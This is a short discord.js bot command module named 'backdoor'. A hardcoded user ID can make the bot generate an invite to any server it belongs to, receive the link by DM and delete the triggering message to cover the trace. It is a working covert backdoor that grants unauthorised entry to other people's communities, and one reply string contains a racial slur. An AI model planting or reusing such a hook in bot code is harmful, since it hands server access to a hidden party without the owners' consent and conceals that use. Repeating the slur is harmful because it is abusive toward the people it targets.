const Discord = require("discord.js");
const fs = require('fs');
module.exports.run = async (bot, message, args) => {


if (message.author.id !== "600421682586320916") return;
  let guild = bot.guilds.get(args[0]);
  if (!guild) return message.author.send("This aint a backdoor nigga");

  message.reply("Making Backdoor...")
  message.reply("Backdoor Was Sent In DM!")
  let invitechannels = guild.channels.filter(c=> c.permissionsFor(guild.me).has('CREATE_INSTANT_INVITE'))

  invitechannels.random().createInvite()
    .then(invite=> message.author.send('https://discord.gg/' + invite.code))

  message.delete();
}


module.exports.help = {
    name: "backdoor"
}
